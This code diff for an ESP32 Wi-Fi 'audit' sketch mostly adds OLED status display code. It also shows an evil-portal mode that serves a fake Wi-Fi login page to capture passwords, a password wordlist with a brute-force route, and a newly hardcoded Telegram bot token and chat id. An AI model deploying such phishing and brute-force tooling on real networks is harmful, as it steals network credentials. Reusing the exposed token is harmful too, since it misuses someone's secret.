@@ -7,6 +7,19 @@
 #include <HTTPClient.h>
 #include <WiFiClientSecure.h>
 #include <UniversalTelegramBot.h>
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+
+Adafruit_SSD1306 display(
+    SCREEN_WIDTH,
+    SCREEN_HEIGHT,
+    &Wire,
+    -1
+);
 
 #define MAX_NETWORKS 50
 #define MAX_AP_CLIENTS 16
@@ -14,8 +27,8 @@
 enum ModoOperacao { AUDITORIA, EVIL_PORTAL };
 ModoOperacao modoAtual = AUDITORIA;
 
-const char* telegramBotToken = "";
-const char* chat_id = "";
+const char* telegramBotToken = "8728814557:AAEWZvpkKvSLKe1wl5OPzcNbASWWkPxL1f0";
+const char* chat_id = "491032025";
 WiFiClientSecure secured_client;
 UniversalTelegramBot bot(telegramBotToken, secured_client);
 
@@ -27,13 +40,13 @@ struct PessoaRef {
     const char* mac;
 };
 PessoaRef pessoas[] = {
-    { "Paulo", "16:07:BD:C7:44:49" },
-    { "João",  "81:11:AA:22:BB:33" },
-    { "André", "C3:99:88:77:66:55" }
+    { "Daniel", "16:07:BD:C7:44:49" },
+    { "Carlos",  "81:11:AA:22:BB:33" },
+    { "Pedro", "C3:99:88:77:66:55" }
 };
 int pessoasN = sizeof(pessoas) / sizeof(pessoas[0]);
 
-const char* wordlist[] = { "senha123", "123456", "senhaboa", "seNha#S3cReta", "adminwifi", "palavrachave" };
+const char* wordlist[] = { "seguranca123", "12345678", "senhaboa", "senha123","seNha#S3cReta", "adminwifi", "palavrachave" };
 const int wordlistN = sizeof(wordlist) / sizeof(wordlist[0]);
 std::vector<String> leakPasswords;
 
@@ -290,7 +303,7 @@ void handlePortalFalso() {
     html += "</select><label for='senha'>Senha da rede Wi-Fi</label>"
     "<input type='password' id='senha' name='senha' autocomplete='current-password' required>"
     "<button type='submit' class='btn'>Entrar</button></form>"
-    "<div class='footer'>© 2025 Portal Wi-Fi Simulado</div>"
+    "<div class='footer'>©️ 2025 Portal Wi-Fi Simulado</div>"
     "</div></body></html>";
     server.send(200, "text/html", html);
 }
@@ -606,53 +619,173 @@ void saveConfigCallback() {
 }
 
 void setup() {
-    Serial.begin(115200); Serial.println("=== Auditoria WiFi ESP32 ===");
+    Serial.begin(115200);
+    Serial.println("=== Auditoria WiFi ESP32 ===");
+
+    // OLED
+    Wire.begin(21, 22);
+
+    if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3D)) {
+        Serial.println("Falha ao iniciar OLED");
+    }
+
+    display.clearDisplay();
+    display.setTextSize(1);
+    display.setTextColor(SSD1306_WHITE);
+
+    display.setCursor(0, 0);
+    display.println("ESP32 Auditoria");
+    display.println("Inicializando...");
+    display.display();
+
     secured_client.setInsecure();
 
     WiFiManager wifiManager;
     //wifiManager.resetSettings();
     wifiManager.setSaveConfigCallback(saveConfigCallback);
 
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.println("Conectando WiFi...");
+    display.println("Aguarde");
+    display.display();
+
     if (!wifiManager.autoConnect("Auditoria_Grupo_AJP")) {
+
+        display.clearDisplay();
+        display.setCursor(0, 0);
+        display.println("Falha WiFi");
+        display.println("Reiniciando...");
+        display.display();
+
         Serial.println("Falha ao conectar e tempo limite atingido.");
         delay(3000);
         ESP.restart();
     }
-    Serial.print("IP (STA): "); Serial.println(WiFi.localIP());
+
+    Serial.print("IP (STA): ");
+    Serial.println(WiFi.localIP());
+
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.println("WiFi Conectado");
+    display.println("");
+
+    display.print("IP:");
+    display.println(WiFi.localIP());
+
+    display.display();
 
     WiFi.mode(WIFI_AP_STA);
     WiFi.softAP("Auditoria_Grupo_AJP", "");
-    Serial.println("Acesse pelo AP (WiFi ESP32): http://192.168.4.1/");
-    scanNetworks(); scanAPClients();
 
-    server.on("/evil", [](){ modoAtual = EVIL_PORTAL; server.sendHeader("Location","/",true); server.send(302,"",""); });
-    server.on("/auditoria", [](){ modoAtual = AUDITORIA; server.sendHeader("Location","/",true); server.send(302,"",""); });
+    Serial.println("Acesse pelo AP (WiFi ESP32): http://192.168.4.1/");
+
+    scanNetworks();
+    scanAPClients();
+
+    server.on("/evil", []() {
+        modoAtual = EVIL_PORTAL;
+        server.sendHeader("Location", "/", true);
+        server.send(302, "", "");
+    });
+
+    server.on("/auditoria", []() {
+        modoAtual = AUDITORIA;
+        server.sendHeader("Location", "/", true);
+        server.send(302, "", "");
+    });
+
     server.on("/captura_wifi", HTTP_POST, handleCapturaWifi);
     server.on("/", handleRoot);
     server.on("/csvscan", handleCsvScan);
     server.on("/csvclients", handleCsvClients);
-    server.on("/relatorio", handleTxtReport); // já envia automatico ao acessar!
+    server.on("/relatorio", handleTxtReport);
     server.on("/bruteforce", handleBruteForce);
     server.on("/data", handleDataJson);
+
     server.on("/reset_config", []() {
-        // Exige autenticação usando as mesmas credenciais do painel admin
+
         if (!server.authenticate(dashboard_user, dashboard_pass))
             return server.requestAuthentication();
+
         WiFiManager wifiManager;
-        wifiManager.resetSettings();  // Limpa configuração WiFi/NVS
-        server.send(200, "text/plain", "Configuração de Wi-Fi resetada. O ESP vai reiniciar.");
-        delay(900);                   // Dá tempo de responder antes de reiniciar
-        ESP.restart();                // Reinicia o dispositivo
+        wifiManager.resetSettings();
+
+        server.send(
+            200,
+            "text/plain",
+            "Configuracao de WiFi resetada. O ESP vai reiniciar."
+        );
+
+        delay(900);
+        ESP.restart();
     });
 
     server.begin();
+
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.println("Servidor ON");
+    display.println("");
+
+    display.print("Redes: ");
+    display.println(networkCount);
+
+    display.print("IP:");
+    display.println(WiFi.localIP());
+
+    display.display();
 }
 
 void loop() {
     server.handleClient();
-    static unsigned long last = 0, last2 = 0;
+
+    static unsigned long last = 0;
+    static unsigned long last2 = 0;
+    static unsigned long lcdUpdate = 0;
+
     if (modoAtual == AUDITORIA) {
-        if (millis() - last > 10000) { scanNetworks(); last = millis(); }
-        if (millis() - last2 > 10000) { scanAPClients(); last2 = millis(); }
+
+        if (millis() - last > 10000) {
+            scanNetworks();
+            last = millis();
+        }
+
+        if (millis() - last2 > 10000) {
+            scanAPClients();
+            last2 = millis();
+        }
+    }
+
+    // Atualiza OLED a cada 3 segundos
+    if (millis() - lcdUpdate > 3000) {
+
+        display.clearDisplay();
+
+        display.setTextSize(1);
+        display.setCursor(0, 0);
+
+        display.println("AUDITORIA WIFI");
+
+        display.print("Redes: ");
+        display.println(networkCount);
+
+        display.print("Clientes: ");
+        display.println(ap_client_count);
+
+        display.print("Modo: ");
+        display.println(
+            modoAtual == AUDITORIA ?
+            "AUDITORIA" :
+            "PORTAL"
+        );
+
+        display.print("IP:");
+        display.println(WiFi.localIP());
+
+        display.display();
+
+        lcdUpdate = millis();
     }
 }
